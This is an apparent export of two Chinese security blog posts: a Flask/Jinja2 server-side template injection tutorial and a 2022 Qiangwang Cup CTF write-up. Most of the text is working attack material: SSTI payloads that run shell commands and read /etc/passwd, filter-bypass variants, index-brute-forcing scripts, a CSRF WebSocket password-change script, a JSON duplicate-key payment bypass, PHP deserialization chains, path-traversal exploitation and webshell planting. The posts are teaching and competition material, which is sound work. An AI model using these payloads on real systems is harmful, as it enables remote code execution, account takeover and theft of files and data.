[{"categories":["技术分享"],"content":"前言 之前一直是套着公式去做ssti的题目，遇到需要一些变化的，可能就会卡住了，所以这里打算学习并梳理一下关于Python中SSTI的知识点 Flask 首先，是python是SSTI，那么就离不开flask，这里用一个简单的flask demo来介绍一下他的模板渲染 构造如下的代码，以及目录结构 目录结构 ├── app.py └── templates └── index.html app.py内容 from flask import Flask from flask import render_template from flask import request from flask import render_template_string app = Flask(__name__) @app.route('/') @app.route('/index') def index(): return render_template(\"index.html\",user=request.args.get(\"name\")) if __name__ == '__main__': app.run(debug=True) index.html的内容 \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eSSTI\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003eHello, {{user.name}}!\u003c/h1\u003e \u003c/body\u003e \u003c/html\u003e 可以看到这里是已经可以进行模板的渲染了，但是我们的{{7*7}}没有被渲染，这是因为这是正确的写法，并不存在SSTI漏洞 而什么情况才会存在SSTI的漏洞呢，很多很多的安全漏洞都源于程序员偷懒的不规范代码，这里也是，假如有个很小的功能点但是开发者不愿意创建一个html文件，选择直接用字符串插入html的话，那么漏洞可能就来了,比如下面这个demo @app.route('/test') def test(): template = \"\"\" \u003cdiv class=\"center-content\"\u003e \u003cp\u003eHello, %s\u003c/p\u003e \u003c/div\u003e \"\"\" % (request.args.get('name')) return render_template_string(template) 可以看到，这里是成功解析了的 攻击原理 那么知道了漏洞存在了以后，我们改怎么利用，我们把最终的目标放在RCE，那么我们怎么才能在双大括号里面RCE，这就得从python语言来说起了，这里先给出几个核心的方法 __class__ 取类 __bases__[0] 拿基类 __base__ 拿基类 __mro__ 返回一个类的调用顺序，__mro__[1]或者__mro__[-1]拿到基类 __subclasses__() 返回子类集合 __init__ 类的初始化方法，所有自带带类都包含init方法，便于利用他当跳板来调用globals __globals__ function.__globals__，用于获取function所处空间下可使用的module、方法以及所有变量 __builtins__ 是一个包含了大量内置函数的一个模块 python中所有的类的基类，都是object，我们可以这样获取类 xx.__class__，例如字符串，元组，列表 在python中每个类都有一个bases属性，这个的意思就是基类，也就是之前提到的object 拿到基层的object，我们就可以往其他的方向去发展了，这里就用到了一个subclasses() 方法，他的作用是：返回的是这个类的子类的集合，也就是object类的子类的集合 那么就可以供我们挑选了，我们找到可以利用的类，选中来利用，例如这里的\u003cclass ‘os._wrap_close’\u003e 不同版本的python可能会在不用的位置，我的环境里是\"\".__class__.__bases__[0].__subclasses__()[133] 这里就到了下一个点，.init.globals，这个init用来初始化类，globals用来全局查找所有方法和变量及参数 可以发现，这里是有popen的，这个就可以命令执行了 这样就可以rce了 {{\"\".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('ls').read()}} 当然这只是其中一个方法，在获取到了object后，能走的路非常多，获取object的方法也很多 比如__mro__，这个就可以用来获取基类，他会返回一个类的调用顺序，其中就必定会有object 利用 ","date":"2022-09-19","objectID":"/ssti/:0:0","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"找利用链 这里我们可以用脚本来跑出我们想要的东西 本地 search = 'popen' num = -1 for i in ().__class__.__bases__[0].__subclasses__(): num += 1 try: if search in i.__init__.__globals__.keys(): print(i, num) except: pass count = -1 for i in ''.__class__.__mro__[-1].__subclasses__(): count += 1 if \"warpper\" in repr(i.__init__): pass else: try: if \"os\" in repr(i.__init__.__globals__): print(count, i) except: pass 远程 import json a = \"\"\" \u003cclass 'type'\u003e,...,\u003cclass 'subprocess.Popen'\u003e \"\"\" num = 0 allList = [] result = \"\" for i in a: if i == \"\u003e\": result += i allList.append(result) result = \"\" elif i == \"\\n\" or i == \",\": continue else: result += i for k,v in enumerate(allList): if \"os._wrap_close\" in v: print(str(k)+\"---\u003e\"+v) 或者直接利用题目环境直接搜出来，例如： 查看warnings.catch_warnings方法的位置 [].__class__.__base__.__subclasses__().index(warnings.catch_warnings) 查看linecatch的位置 [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index('linecache') 剩下的以此类推 ","date":"2022-09-19","objectID":"/ssti/:1:0","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"RCE ","date":"2022-09-19","objectID":"/ssti/:2:0","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"eval 首先，题目环境的不一样可能需要我们去找环境中含有内建函数 eval 的子类的索引号 这里脚本的原理就是通过遍历__subclasses__，然后再通过.__init__.__globals__['__builtins__']里面找是否存在eval函数字眼 import requests for i in range(500): url = \"http://xxx/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__['__builtins__']}}\" res = requests.get(url=url) if 'eval' in res.text: print(i) 我们可以记下几个含有eval函数的类： warnings.catch_warnings WarningMessage codecs.IncrementalEncoder codecs.IncrementalDecoder codecs.StreamReaderWriter os._wrap_close reprlib.Repr weakref.finalize 示例payload {{''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls /\").read()')}} ","date":"2022-09-19","objectID":"/ssti/:2:1","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"os模块 Python的 os 模块中有system和popen这两个函数可用来执行命令，system没有回显，popen有回显 而找os模块的方法就和上面的差不多，可以编写脚本，遍历subclass的类里的__init__.__globals__ 查找里面有没有导入os模块 import requests for i in range(500): url = \"http://xxx/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__}}\" res = requests.get(url=url, headers=headers) if 'os.py' in res.text: print(i) 示例payload {{''.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__['os'].popen('ls /').read()}} ","date":"2022-09-19","objectID":"/ssti/:2:2","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"subprocess.popen类 subprocess 意在替代其他几个老的模块或者函数，比如：os.system、os.popen 等函数。 import requests for i in range(500): url = \"http://xxx/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"]}}\" res = requests.get(url=url, headers=headers) if 'linecache' in res.text: print(i) 则构造如下payload执行命令即可： {{[].__class__.__base__.__subclasses__()[245]('ls /',shell=True,stdout=-1).communicate()[0].strip()}} ","date":"2022-09-19","objectID":"/ssti/:2:3","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"linecache 函数 linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块 import requests for i in range(500): url = \"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__}}\" res = requests.get(url=url, headers=headers) if 'linecache' in res.text: print(i) 示例payload {{[].__class__.__base__.__subclasses__()[168].__init__.__globals__['linecache']['os'].popen('ls /').read()}}{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()}} ","date":"2022-09-19","objectID":"/ssti/:2:4","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"lipsum 前段时间兴起的一条路，非常方便的可以进行rce {{lipsum.__globals__['os'].popen('whoami').read()}} {{lipsum.__globals__.os.popen('whoami').read()}} {{lipsum.__globals__['__builtins__']['eval'](\"__import__('os').popen('whoami').read()\")}} ","date":"2022-09-19","objectID":"/ssti/:2:5","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"文件读取 如果实在没有命令执行，那就看看有没有文件读取的操作 python2中file类可以直接用来读取文件 {{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}} python3中没有这个file类，可以用\u003cclass '_frozen_importlib_external.FileLoader'\u003e 这个类去读取文件。 import requests for i in range(500): url = \"http://xxx/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"]}}\" res = requests.get(url=url, headers=headers) if 'FileLoader' in res.text: print(i) 示例payload {{().__class__.__bases__[0].__subclasses__()[79][\"get_data\"](0, \"/etc/passwd\")}} Bypass ","date":"2022-09-19","objectID":"/ssti/:3:0","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"{{ 绕过方法 （直接写给gitpage整报错了） ","date":"2022-09-19","objectID":"/ssti/:4:0","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"[] 过滤了[]后，我们payload有几个地方就过不去了 {{\"\".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('ls').read()}} ","date":"2022-09-19","objectID":"/ssti/:5:0","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"getitem 那么这里就可以利用函数getitem()进行获取列表元素，payload就变成这样 {{\"\".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('ls').read()}} ","date":"2022-09-19","objectID":"/ssti/:5:1","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"pop 最好不要用pop()，因为pop()会删除相应位置的值 {{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()}}// 指定序列属性 {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop('__builtins__').pop('eval')('__import__(\"os\").popen(\"ls /\").read()')}}// 指定字典属性 ","date":"2022-09-19","objectID":"/ssti/:5:2","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"字典 我们知道访问字典里的值有两种方法，一种是把相应的键放入熟悉的方括号 [] 里来访问，一种就是用点 . 来访问。所以，当方括号 [] 被过滤之后，我们还可以用点 . 的方式来访问，如下示例 __builtins__.eval() {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval('__import__(\"os\").popen(\"ls /\").read()')}} 等同于： [__builtins__]['eval']() {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls /\").read()')}} ","date":"2022-09-19","objectID":"/ssti/:5:3","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"_ 利用request对象绕过 {{()[request.args.class][request.args.bases][0][request.args.subclasses]()[40]('/flag').read()}}\u0026class=__class__\u0026bases=__bases__\u0026subclasses=__subclasses__ {{()[request.args.class][request.args.bases][0][request.args.subclasses]()[77].__init__.__globals__['os'].popen('ls /').read()}}\u0026class=__class__\u0026bases=__bases__\u0026subclasses=__subclasses__ 等同于： {{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}} ","date":"2022-09-19","objectID":"/ssti/:6:0","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"引号' ","date":"2022-09-19","objectID":"/ssti/:7:0","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"利用chr()绕过 先获取chr()函数，赋值给chr，后面再拼接成一个字符串 {% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}} # {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}} 等同 {{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}} ","date":"2022-09-19","objectID":"/ssti/:7:1","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"利用request对象绕过 示例： {{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}\u0026path=/etc/passwd {{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}\u0026os=os\u0026cmd=ls / 等同于： {{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}} {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}} 如果过滤了args，可以将其中的request.args改为request.values，POST和GET两种方法传递的数据request.values都可以接收。 ","date":"2022-09-19","objectID":"/ssti/:7:2","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"点. ","date":"2022-09-19","objectID":"/ssti/:8:0","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"利用 |attr() 绕过（适用于flask） 如果 . 也被过滤，且目标是JinJa2（flask）的话，可以使用原生JinJa2函数attr()，即： ().__class__ =\u003e ()|attr(\"__class__\") 示例 {{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__\")()|attr(\"__getitem__\")(77)|attr(\"__init__\")|attr(\"__globals__\")|attr(\"__getitem__\")(\"os\")|attr(\"popen\")(\"ls /\")|attr(\"read\")()}} 等同于 {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}} ","date":"2022-09-19","objectID":"/ssti/:8:1","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"利用中括号[ ]绕过 如下示例： {{''['__class__']['__bases__'][0]['__subclasses__']()[59]['__init__']['__globals__']['__builtins__']['eval']('__import__(\"os\").popen(\"ls\").read()')}} 等同于： {{().__class__.__bases__.[0].__subclasses__().[59].__init__['__globals__']['__builtins__'].eval('__import__(\"os\").popen(\"ls /\").read()')}} ","date":"2022-09-19","objectID":"/ssti/:8:2","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"组合绕过 ","date":"2022-09-19","objectID":"/ssti/:9:0","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":". + [] {{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__\")()|attr(\"__getitem__\")(77)|attr(\"__init__\")|attr(\"__globals__\")|attr(\"__getitem__\")(\"os\")|attr(\"popen\")(\"ls\")|attr(\"read\")()}} ","date":"2022-09-19","objectID":"/ssti/:9:1","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"__ +.+[] 原payload {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls /\").read()')}} 用 __getitem__()来绕过 由于还过滤了下划线 __，我们可以用request对象绕过，但是还过滤了中括号 []，所以我们要时绕过 __和 [，就用到了我们的|attr() 最后 {{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}\u0026x1=__class__\u0026x2=__base__\u0026x3=__subclasses__\u0026x4=__getitem__\u0026x5=__init__\u0026x6=__globals__\u0026x7=__builtins__\u0026x8=eval\u0026x9=__import__(\"os\").popen('ls /').read() ","date":"2022-09-19","objectID":"/ssti/:9:2","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"‘+\" {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}\u0026path=/etc/passwd ","date":"2022-09-19","objectID":"/ssti/:9:3","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"_+'+\" {{''[request.args.class][request.args.mro][2]request.args.subclasses.read() }}\u0026class=_class__\u0026mro=_mro__\u0026subclasses=__subclasses__ ","date":"2022-09-19","objectID":"/ssti/:9:4","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["技术分享"],"content":"_ +. +’ {{\"\".__class__}} {{\"\"[\"\\\\x5f\\\\x5fclass\\\\x5f\\\\x5f\"]}} {{\"\"[\"\\\\x5f\\\\x5fclass\\\\x5f\\\\x5f\"][\"\\\\x5F\\\\x5Fbases\\\\x5F\\\\x5F\"][0][\"\\\\x5F\\\\x5Fsubclasses\\\\x5F\\\\x5F\"]()[91][\"get\\\\x5Fdata\"](0, \"/flag\")}} #也就是 {{\"\".__class__.__bases__[0].__subclasses__()[91].get_data(0,\"/flag\")}} 参考文章 https://xz.aliyun.com/t/7746 https://xz.aliyun.com/t/9584 https://www.freebuf.com/articles/network/258136.html https://hoad-sc.blog.csdn.net/article/details/113778233 https://xz.aliyun.com/t/6885 https://www.freebuf.com/articles/web/264088.html http://h0cksr.xyz/archives/340 ","date":"2022-09-19","objectID":"/ssti/:9:5","tags":null,"title":"SSTI_OF_FLASK","uri":"/ssti/"},{"categories":["CTF"],"content":"rcefile ","date":"2022-07-31","objectID":"/qwb2022/:0:0","tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/"},{"categories":["CTF"],"content":"预期解 原题改的：https://cloud.tencent.com/developer/article/1717668 首先是www.zip源码泄露 先看config.inc.php这里有spl_autoload_register()，这个函数是会加载inc文件的 这里会检测cookie，如果有userfile的话，会进行反序列化 \u003c?php spl_autoload_register(); error_reporting(0); function e($str){ return htmlspecialchars($str); } $userfile = empty($_COOKIE[\"userfile\"]) ? [] : unserialize($_COOKIE[\"userfile\"]); ?\u003e\u003cp\u003e \u003ca href=\"/index.php\"\u003eIndex\u003c/a\u003e \u003ca href=\"/showfile.php\"\u003efiles\u003c/a\u003e \u003c/p\u003e 这里有文件上传的功能，我们可以上传一个inc文件里面是一句话木马，这里我们把文件名放进cookie里面构造一个序列化数据即可 把cookie替换，成功通过spl_autoload_register()包含 ","date":"2022-07-31","objectID":"/qwb2022/:1:0","tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/"},{"categories":["CTF"],"content":"非预期解 直接上传phar文件，发现是可以解析的 babyweb 目录扫描到下面结果 扫到一个buy，测试一下需要post发包，然后需要admin 看起来是需要拿到admin的权限，然后去这里发包拿flag 进去里面发现有个修改密码的功能点，还有个报告bug的功能点，这组合起来就是一个csrf的利用了 这里修改密码是要ws发包过去的，我直接对着题目的js做了一点修改然后放到服务器 一开始一直没成功，后来发现可能得用内网的地址，刚好题目给了docker部署的命令，所以知道端口是8888 构造如下的csrf脚本 \u003cscript\u003e var ws = null; var host = \"127.0.0.1:8888\" var url = \"ws://\" + host + \"/bot\"; ws = new WebSocket(url); ws.onopen = function (event) { console.log('connection open!') var msg = \"changepw 123\"; ws.send(msg); console.log('changepw') } ws.onmessage = function (ev) { botsay(ev.data); }; ws.onerror = function () { console.log(\"connection error\"); }; ws.onclose = function () { console.log(\"connection close!\"); }; \u003c/script\u003e 修改密码进入后，发现有个购买界面，这里的钱只够购买hint，下载到是源码 app.py @app.route(\"/buy\", methods=['POST']) def buy(): if not session: return redirect('/login') elif session['user'] != 'admin': return \"you are not admin\" else : result = {} data = request.get_json() product = data[\"product\"] for i in product: if not isinstance(i[\"id\"],int) or not isinstance(i[\"num\"],int): return \"not int\" if i[\"id\"] not in (1,2): return \"id error\" if i[\"num\"] not in (0,1,2,3,4,5): return \"num error\" result[i[\"id\"]] = i[\"num\"] sql = \"select money,flag,hint from qwb where username='admin'\" conn = sqlite3.connect('/root/py/test.db') c = conn.cursor() cursor = c.execute(sql) for row in cursor: if len(row): money = row[0] flag = row[1] hint = row[2] data = b'{\"secret\":\"xxxx\",\"money\":' + str(money).encode() + b',' + request.get_data()[1:] #secret已打码 r = requests.post(\"\u003chttp://127.0.0.1:10002/pay\u003e\",data).text r = json.loads(r) if r[\"error\"] != 0: return r[\"error\"] money = int(r[\"money\"]) hint = hint + result[1] flag = flag + result[2] sql = \"update qwb set money={},hint={},flag={}where username='admin'\".format(money,hint,flag) conn = sqlite3.connect('/root/py/test.db') c = conn.cursor() try: c.execute(sql) conn.commit() except Exception as e: conn.rollback() c.close() conn.close() return \"database error\" return \"success\" pay.go package main import ( \"github.com/buger/jsonparser\" \"fmt\" \"net/http\" \"io/ioutil\" \"io\" ) func pay(w http.ResponseWriter, r *http.Request) { var cost int64 = 0 var err1 int64 = 0 json, _ := ioutil.ReadAll(r.Body) secret, err := jsonparser.GetString(json, \"secret\") if err != nil { fmt.Println(err) } if secret != \"xxxx\"{ //secret已打码 io.WriteString(w, \"{\\\\\"error\\\\\": \\\\\"secret error\\\\\"}\") return } money, err := jsonparser.GetInt(json, \"money\") if err != nil { fmt.Println(err) } _, err = jsonparser.ArrayEach( json, func(value []byte, dataType jsonparser.ValueType, offset int, err error) { id, _ := jsonparser.GetInt(value, \"id\") num, _ := jsonparser.GetInt(value, \"num\") if id == 1{ cost = cost + 200 * num }else if id == 2{ cost = cost + 1000 * num }else{ err1 = 1 } }, \"product\") if err != nil { fmt.Println(err) } if err1 == 1{ io.WriteString(w, \"{\\\\\"error\\\\\": \\\\\"id error\\\\\"}\") return } if cost \u003e money{ io.WriteString(w, \"{\\\\\"error\\\\\": \\\\\"Sorry, your credit is running low!\\\\\"}\") return } money = money - cost io.WriteString(w, fmt.Sprintf(\"{\\\\\"error\\\\\":0,\\\\\"money\\\\\": %d}\", money)) } func main() { mux := http.NewServeMux() mux.HandleFunc(\"/pay\", pay) http.ListenAndServe(\":10002\", mux) } 一个go和python联合的题目，大概的逻辑是这样 通俗点讲，python是用来发货的，go是用来付款的，python发货前会通过go来进行付款校验 所以我们要获取flag，就得让python发货，而go不进行付款 这里就有两个思路： go的整数溢出 python的flask和go的jsonparser对于json同名数据的不同处理 ","date":"2022-07-31","objectID":"/qwb2022/:2:0","tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/"},{"categories":["CTF"],"content":"go的整数溢出 这里的cost的定义为int64 var cost int64 = 0 最后生成cost的时候，我们传入num，然后计算cost去进行判断 if id == 1{ cost = cost + 200 * num }else if id == 2{ cost = cost + 1000 * num }else{ err1 = 1 } 这里我们num传入很大的值，就会溢出，导致cost会小于money，这样就成功过了go ","date":"2022-07-31","objectID":"/qwb2022/:3:0","tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/"},{"categories":["CTF"],"content":"json处理不同 这里我搭建了一个本地的环境 from flask import request,Flask app = Flask(__name__) @app.route(\"/buy\", methods=['POST']) def buy(): data = request.get_json() product = data[\"product\"] return str(product) if __name__ == \"__main__\": app.run(debug=\"on\",port=10000) 可以看到，如果出现了同一个键的json数据，flask里面的get_json会取最后的 再看go的jsonparser package main import \"github.com/buger/jsonparser\" data := []byte(`{\"id\":1,\"id\":2}`) id := jsonparser.GetString(data, \"id\") print(id) 这里却是取的前者 所以这里他们解析json的方式会不一样，那么我们传入这样的参数 {\"product\":[{\"id\":1,\"num\":0},{\"id\":2,\"num\":0}],\"product\":[{\"id\":1,\"num\":0},{\"id\":2,\"num\":1}]} 这里python收到以后，会取后者，也就是flag的num为1，而go会取前者，也就是flag的num为0 这个意思就是，python会发货，但是go并不会花钱，达到购买的效果 easyweb 首先是一个文件读取的漏洞，但是要求读取的文件里面必须有demo或者host 那么我们就可以这样做 /showfile.php?f=./demo/../index.php 读取到下面的文件 index.php \u003c?php $upload = md5(\"2022qwb\".$_SERVER['REMOTE_ADDR']); @mkdir($upload, 0333, true); if(isset($_POST['submit'])) { include 'upload.php'; } ?\u003e upload.php \u003c?php error_reporting(0); require_once('class.php'); if(isset($_SESSION)){ if(isset($_GET['fname'])?!empty($_GET['fname']):FALSE){ $_FILES[\"file\"][\"name\"] = $_GET['fname']; } $upload = new Upload(); $upload-\u003eupload(); }else { die(\"\u003cp class='tip'\u003eguest can not upload file\u003c/p\u003e\"); } ?\u003e class.php \u003c?php class Upload { public $file; public $filesize; public $date; public $tmp; function __construct(){ $this-\u003efile = $_FILES[\"file\"]; } function do_upload() { $filename = session_id().explode(\".\",$this-\u003efile[\"name\"])[0].\".jpg\"; if(file_exists($filename)) { unlink($filename); } move_uploaded_file($this-\u003efile[\"tmp_name\"],md5(\"2022qwb\".$_SERVER['REMOTE_ADDR']).\"/\".$filename); echo 'upload '.\"./\".md5(\"2022qwb\".$_SERVER['REMOTE_ADDR']).\"/\".$this-\u003ee($filename).' success!'; } function e($str){ return htmlspecialchars($str); } function upload() { if($this-\u003echeck()) { $this-\u003edo_upload(); } } function __toString(){ return $this-\u003efile[\"name\"]; } function __get($value){ $this-\u003efilesize-\u003e$value = $this-\u003edate; echo $this-\u003etmp; } function check() { $allowed_types = array(\"jpg\",\"png\",\"jpeg\"); $temp = explode(\".\",$this-\u003efile[\"name\"]); $extension = end($temp); if(in_array($extension,$allowed_types)) { return true; } else { echo 'Invalid file!'; return false; } } } class GuestShow{ public $file; public $contents; public function __construct($file) { $this-\u003efile=$file; } function __toString(){ $str = $this-\u003efile-\u003ename; return \"\"; } function __get($value){ return $this-\u003e$value; } function show() { $this-\u003econtents = file_get_contents($this-\u003efile); $src = \"data:jpg;base64,\".base64_encode($this-\u003econtents); echo \"\u003cimg src={$src}/\u003e\"; } function __destruct(){ echo $this; } } class AdminShow{ public $source; public $str; public $filter; public function __construct($file) { $this-\u003esource = $file; $this-\u003eschema = 'file:///var/www/html/'; } public function __toString() { $content = $this-\u003estr[0]-\u003esource; $content = $this-\u003estr[1]-\u003eschema; return $content; } public function __get($value){ $this-\u003eshow(); return $this-\u003e$value; } public function __set($key,$value){ $this-\u003e$key = $value; } public function show(){ if(preg_match('/usr|auto|log/i' , $this-\u003esource)) { die(\"error\"); } $url = $this-\u003eschema . $this-\u003esource; $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_HEADER, 1); $response = curl_exec($curl); curl_close($curl); $src = \"data:jpg;base64,\".base64_encode($response); echo \"\u003cimg src={$src}/\u003e\"; } public function __wakeup() { if ($this-\u003eschema !== 'file:///var/www/html/') { $this-\u003eschema = 'file:///var/www/html/'; } if ($this-\u003esource !== 'admin.png') { $this-\u003esource = 'admin.png'; } } } class.php里面，AdminShow类里面有wakeup方法，这里导致无法修改schema和source 这里需要绕过AdminShow的wakeup 再看利用方面，这里的show，是有个file_get_contents的，所以我们这里可以触发一个phar 然后看，这里upload必须有个$_SESSION，所以我们上传可以添加一个sessionupload \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003cbody\u003e \u003cform action=\"\u003chttp://47.104.95.124:8080/index.php\u003e\" method=\"POST\" enctype=\"multipart/form-data\"\u003e \u003cinput type=\"file\" name=\"file\" /\u003e \u003cinput type=\"submit\" name=\"submit\" valu","date":"2022-07-31","objectID":"/qwb2022/:4:0","tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/"},{"categories":["CTF"],"content":"非预期 题目只要求构造504就有flag，那么就不一定得按题目走下去，所以我这里应该是非预期了，我让这个会话sleep一段时间，多发几个包，服务器就会受不了了 ","date":"2022-07-31","objectID":"/qwb2022/:5:0","tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/"},{"categories":["CTF"],"content":"预期 预期就是走题目的逻辑，他会判断secret是否匹配，但是这里是secret是未知的 if userdata.token!=hash(get_password(userdata.username)): return \"Login First\" if userdata.username=='admin': return \"Welcome admin, here is your next challenge!\" def get_password(username): if username==\"admin\": return admin.secret else: # conn=sqlite3.connect(\"user.db\") # cursor=conn.cursor() # cursor.execute(f\"select password from usertable where username='{username}'\") # data=cursor.fetchall()[0] # if data: # return data[0] # else: # return None return session.get(\"password\") 这题有点像：高校战疫网络安全分享赛:webtmp，做法就是覆盖掉secret绕过验证，只不过这里对secret关键词进行了过滤，解决办法是unicode编码 这里看到nu1l的wp，发现可以直接hex绕，也是可以的 b'''capp admin (S'\\\\x73ecret' S'1' db.''' 进去就可以修改负载均衡的配置了 WP-UM 一进去就是一个安装 账号密码放在根目录下了，这就很刻意的让我们去目录遍历去找账号密码了 他提到了危险出插件，题目给了源码，我们直接进去看看装了什么插件 这个user-meta搜了一下，确实存在一个目录遍历的漏洞，看一下版本正好对上，是CVE-2022-0779 https://skynettools.com/wordpress-user-meta-lite-and-pro-2-4-3-vulnerable-to-path-traversal-exploit/ 成功探测到 这样探测出用户名密码：MaoGePaMao:MaoGeYaoQiFeiLa 进到后台，在外观编辑处可以直接编辑php代码，直接写php木马 进蚁剑翻了很久很久翻到了flag。。。 easylogin wordpress这个版本存在sql注入，这里进行报错注入测试 https://www.freebuf.com/articles/web/321297.html 报错注入成功 直接sqlmap嗦 --- web server operating system: Linux Ubuntu 20.04 or 19.10 (focal or eoan) web application technology: Apache 2.4.41 back-end DBMS: MySQL \u003e= 5.0 (MariaDB fork) Database: moodle [428 tables] +----------------------------------+ | mdl_analytics_indicator_calc | | mdl_analytics_models | | mdl_analytics_models_log | 。。。。。。。。。。。。。。。。。 | mdl_tool_recyclebin_category | | mdl_tool_recyclebin_course | | mdl_tool_usertours_steps | | mdl_tool_usertours_tours | | mdl_upgrade_log | | mdl_url | | mdl_user | | mdl_user_devices | | mdl_user_enrolments | | mdl_user_info_category | | mdl_user_info_data | | mdl_user_info_field | | mdl_user_lastaccess | | mdl_user_password_history | | mdl_user_password_resets | | mdl_user_preferences | | mdl_user_private_key | | ............. +----------------------------------+ 这里本地搭建了一个moodle来调试 这里前端只有一个功能点，就是重置密码，他会要求你写一个邮箱，然后发送修改密码的连接给你，所以我猜测是不是可以去构造这个链接，而且在dump出几个表来看，只有这个表mdl_user_password_resets存在一些数据 Database: moodle Table: mdl_user_password_history [0 entries] +----+--------+------+-------------+ | id | userid | hash | timecreated | +----+--------+------+-------------+ +----+--------+------+-------------+ Database: moodle Table: mdl_user_password_resets [1 entry] 